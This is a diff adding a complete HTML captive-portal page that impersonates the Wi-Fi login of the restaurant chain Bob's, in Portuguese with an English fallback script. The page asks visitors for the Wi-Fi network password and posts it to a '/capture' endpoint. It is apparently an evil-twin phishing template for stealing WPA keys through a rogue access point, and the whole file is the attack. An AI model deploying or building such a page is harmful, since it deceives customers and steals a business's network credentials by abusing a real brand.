@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<meta name="robots" content="noindex, nofollow">
+<title>Bob's - Wi-Fi</title>
+<style>
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+html { font-size: 16px; }
+body { min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; font-family: 'Arial Black', 'Arial Bold', Gadget, sans-serif; background: #E31837; color: #222; padding: 16px; }
+.card { background: #FFFFFF; border-radius: 12px; padding: 32px 28px; width: 100%; max-width: 400px; box-shadow: 0 4px 24px rgba(0,0,0,0.2); }
+.logo { text-align: center; margin-bottom: 4px; }
+.logo-circle { display: inline-block; background: #E31837; color: #FFD700; border-radius: 50%; width: 80px; height: 80px; line-height: 80px; font-size: 36px; font-weight: 900; box-shadow: 0 2px 8px rgba(0,0,0,0.2); }
+.logo-name { display: block; margin-top: 8px; margin-bottom: 16px; font-size: 22px; font-weight: 900; color: #E31837; letter-spacing: 2px; }
+.subtitle { text-align: center; color: #555; font-size: 14px; margin-bottom: 28px; line-height: 1.5; }
+.form-group { margin-bottom: 16px; }
+label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 6px; color: #222; }
+input[type="password"], input[type="email"], input[type="text"] { width: 100%; padding: 13px 16px; border: 1.5px solid #DDD; border-radius: 8px; font-size: 15px; background: #FAFAFA; color: #222; outline: none; transition: border-color 0.2s; }
+input:focus { border-color: #E31837; }
+button[type="submit"] { width: 100%; padding: 14px; background: #E31837; color: #FFD700; border: none; border-radius: 8px; font-size: 16px; font-weight: 900; cursor: pointer; margin-top: 8px; transition: opacity 0.2s; letter-spacing: 1px; }
+button:hover { opacity: 0.92; }
+.footer { text-align: center; margin-top: 20px; font-size: 11px; color: #999; }
+input[type="hidden"] { display: none; }
+@media (max-width: 480px) { .card { padding: 24px 18px; } }
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="logo">
+    <span class="logo-circle">B</span>
+    <span class="logo-name">Bob's</span>
+  </div>
+  <p class="subtitle">Acesse o Wi-Fi do Bob's. Conecte-se com a senha da rede.</p>
+  <form action="/capture" method="POST" autocomplete="off">
+    <input type="hidden" name="csrf_token" value="">
+    <input type="hidden" name="portal_id" value="bobs">
+    <div class="form-group">
+      <label for="password">Senha do Wi-Fi</label>
+      <input type="password" name="password" id="password" placeholder="Digite a senha" required minlength="8" maxlength="63" autocomplete="new-password">
+    </div>
+    <button type="submit">CONECTAR</button>
+  </form>
+  <p class="footer">Wi-Fi gratuito para clientes Bob's. Bom sabor e boa conexao!</p>
+</div>
+<script>
+(function(){
+  var lang = navigator.language || 'pt-BR';
+  if (lang.startsWith('en')) {
+    document.querySelector('.subtitle').textContent = "Access Bob's Wi-Fi. Connect with the network password.";
+    document.querySelector('button[type=submit]').textContent = 'CONNECT';
+    document.querySelector('.footer').textContent = "Free Wi-Fi for Bob's customers. Great flavor and connection!";
+    document.querySelector('label[for=password]').textContent = 'Wi-Fi Password';
+  }
+})();
+</script>
+</body>
+</html>
